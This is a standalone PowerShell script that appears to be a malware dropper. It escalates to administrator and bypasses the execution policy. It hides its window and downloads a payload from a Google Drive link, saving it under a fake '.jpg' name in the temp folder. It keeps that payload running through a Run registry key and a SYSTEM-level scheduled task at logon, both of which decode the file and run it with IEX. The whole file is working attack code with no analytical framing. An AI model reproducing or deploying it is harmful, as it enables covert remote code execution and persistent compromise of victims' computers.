if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){
    Start-Process -Verb RunAs powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden;exit
}
if (-not ([Environment]::GetCommandLineArgs() -match '-ExecutionPolicy')) {
    Start-Process -WindowStyle Hidden powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$PSCommandPath`""
    exit
}
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

$fileId = "1klQy_EmoE-HShAfXat87Ui77BCfHPlau"
$url = "https://drive.google.com/uc?export=download&id=$fileId"
$path = "$env:TEMP\x64_cli.jpg"
$taskName = "x64-cli-core"
$regName = "x64-cli-core"

(New-Object Net.WebClient).DownloadFile($url, $path)

icacls $path /grant SYSTEM:F /T /Q 2>$null

$cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command `"`$bytes = [System.IO.File]::ReadAllBytes('$path'); `$script = [System.Text.Encoding]::UTF8.GetString(`$bytes); if (`$script -match '^[A-Za-z0-9+/=]+$') { `$script = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$script)) }; IEX `$script`""

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name $regName -Value $cmd -Force

schtasks /delete /tn $taskName /f 2>$null

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command `"`$bytes = [System.IO.File]::ReadAllBytes('$path'); `$script = [System.Text.Encoding]::UTF8.GetString(`$bytes); if (`$script -match '^[A-Za-z0-9+/=]+$') { `$script = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$script)) }; IEX `$script`""
$trigger = New-ScheduledTaskTrigger -AtLogOn -User (Get-CimInstance -ClassName Win32_ComputerSystem).UserName
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
